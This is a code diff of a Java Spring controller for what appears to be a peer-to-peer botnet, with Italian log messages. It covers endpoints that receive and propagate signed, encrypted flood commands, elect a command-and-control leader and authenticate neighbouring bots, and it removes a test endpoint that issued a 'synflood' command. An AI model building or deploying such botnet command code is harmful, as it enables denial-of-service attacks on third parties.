@@ -50,14 +50,11 @@ public class BotController {
 
 	@RequestMapping(value = "/flood", method = RequestMethod.POST)
 	public Boolean msgFlood(@RequestBody String msg, HttpServletRequest req) {
-
-
-		 System.out.println("non lo mando a addr: " + req.getRemoteAddr());
-		 System.out.println("host: " + req.getRemoteHost());
-
-		
 		IP ip = new IP(req.getRemoteAddr());
 		System.out.println("Richiesta di Flood ricevuta da " + ip.toString());
+		System.out.println("Non lo mando a addr: " + req.getRemoteAddr());
+		System.out.println("Host: " + req.getRemoteHost());
+
 		bhv.floodAndExecute(msg, ip);
 		return true;
 	}
@@ -65,15 +62,11 @@ public class BotController {
 	@RequestMapping("/newKing")
 	public Boolean newKing(HttpServletRequest req) {
 		System.out.println("Richiesta di Elezione ricevuta da" + req.getRemoteAddr());
-		if (bhv.getpServ().getNewKing().equals("") && nServ.isElegible() && (!(engineBot.isCommandandconquerStatus()))) {
-
-			 System.out.println("addr: " + req.getRemoteAddr());
-			 System.out.println("host: " + req.getRemoteHost());
-
+		if (bhv.getpServ().getNewKing().equals("") && nServ.isElegible()
+				&& (!(engineBot.isCommandandconquerStatus()))) {
 			bhv.getPower(req.getRemoteAddr());
 			return true;
 		} else {
-			// System.out.println("not elegible or already elected");
 			System.out.println("Non elegibile o gia eletto");
 			return false;
 		}
@@ -81,7 +74,7 @@ public class BotController {
 
 	@RequestMapping(value = "/myneighbours/welcome", method = RequestMethod.POST)
 	public Pairs<Long, Integer> myNeighbours(@RequestBody String idBot, HttpServletRequest req) {
-		System.out.println("Richiesta challenge vicino ricevuta da" + req.getRemoteAddr());
+		System.out.println("Richiesta challenge vicinato ricevuta da" + req.getRemoteAddr());
 		Pairs<Long, Integer> response = new Pairs<>();
 		response = bhv.authReqBot(idBot);
 		return response;
@@ -89,7 +82,7 @@ public class BotController {
 
 	@RequestMapping(value = "/myneighbours/hmac", method = RequestMethod.POST)
 	public Boolean myNeighboursHmac(@RequestBody ArrayList<Object> objects, HttpServletRequest req) {
-		System.out.println("Richiesta hmac vicino ricevuta da" + req.getRemoteAddr());
+		System.out.println("Richiesta Hmac vicinato ricevuta da" + req.getRemoteAddr());
 		Boolean response = false;
 		response = bhv.checkHmacBot(objects);
 		if (response) {
@@ -102,43 +95,8 @@ public class BotController {
 		return response;
 	}
 
-	
-	
-	
 	@RequestMapping(value = "/ping", method = RequestMethod.POST)
 	public Boolean ping(HttpServletRequest req) {
-		return true;
-	}
-
-	
-	
-	
-	
-	@RequestMapping("/testing")
-	public Boolean testing() {
-		String cmd = "synflood";
-		String msg = "";
-		Long milli = System.currentTimeMillis();
-
-		Random rand = new SecureRandom(milli.toString().getBytes());
-		Integer nounce = rand.nextInt();
-
-		String hashIdMsg = pki.getCrypto().generateSha256(nounce.toString());
-
-		String signature;
-		try {
-			signature = pki.signMessageRSA(hashIdMsg);
-			System.out.println("signature originale " + signature);
-			msg = hashIdMsg + "<HH>" + cmd + "<HH>" + signature;
-			System.out.println("msg originale " + msg);
-			msg = pki.getCrypto().encryptAES(msg);
-			System.out.println("raw originale " + msg);
-		} catch (InvalidKeyException | SignatureException e) {
-			e.printStackTrace();
-			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
-		}
-
-		bhv.floodAndExecute(msg, nServ.getMyIp());
 		return true;
 	}
 
